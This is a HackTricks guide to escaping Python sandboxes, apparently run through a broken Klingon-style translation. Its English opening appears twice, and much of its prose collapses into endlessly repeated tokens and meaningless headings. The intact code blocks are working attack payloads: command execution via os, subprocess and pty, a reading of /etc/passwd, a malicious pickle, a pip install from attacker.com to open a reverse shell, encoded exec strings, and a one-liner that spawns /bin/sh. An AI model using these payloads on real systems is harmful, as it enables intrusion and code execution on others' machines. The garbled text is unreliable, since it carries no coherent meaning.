# Bypass Python sandboxes

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

These are some tricks to bypass python sandbox protections and execute arbitrary commands.

## Command Execution Libraries

The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:

Klingon Translation:

# Bypass Python sandboxes

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

These are some tricks to bypass python sandbox protections and execute arbitrary commands.

## Command Execution Libraries

The first thing you need to know is if you can directly execute code with some already imported library, or if you could import any of these libraries:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
**ghItlhvam** _**open**_ **je** _**read**_ **ghItlhvam** **files** **cha'logh** **python sandbox** **'ej** **code** **cha'logh** **bIghel** **bypass**.

{% hint style="danger" %}
**Python2 input()** **function** **python code** **program crashes** **bIghel**.
{% endhint %}

Python **libraries** **load** **current directory** **first** (the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## Bypass pickle sandbox with the default installed python packages

### Default packages

**list of pre-installed** **packages** **yIqaw** **'ej** [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
**pickle** **python env** **import arbitrary libraries** **installed** **system**.\
**Example**, **pickle**, **loaded**, **pip library** **use** **bIghel**:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
For more information about how pickle works check this: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pip package

Trick shared by **@isHaacK**

If you have access to `pip` or `pip.main()` you can install an arbitrary package and obtain a reverse shell calling:
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
**bypass-python-sandboxes/README.md**

---

# Bypass Python Sandboxes

---

**QaH** **package** **download** **laH** **reverse shell** **DIvI'**. **ghu'** **ghItlh** **'ej** **'oH** **'ej** **reverse shell** **DIvI'** **IP** **put** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'ej** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH** **'oH
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### tlhIngan Hol

### vItlhutlh

#### `exec`

`exec` vItlhutlh python code 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e' vItlhutlh. 'ej vItlhutlh 'e'
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## Qapla'wI' je 'ej qutlh! 

### 'op
#### 'op
##### 'op
###### 'op

### Qapla'wI' je 'ej qutlh! 

#### 'op
##### 'op
###### 'op

### Qapla'wI' je 'ej qutlh! 

#### 'op
##### 'op
###### 'op
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## Bypassing protections through encodings (UTF-7)

In [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy) UFT-7 is used to load and execute arbitrary python code inside an apparent sandbox:

##  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  (UTF-7)  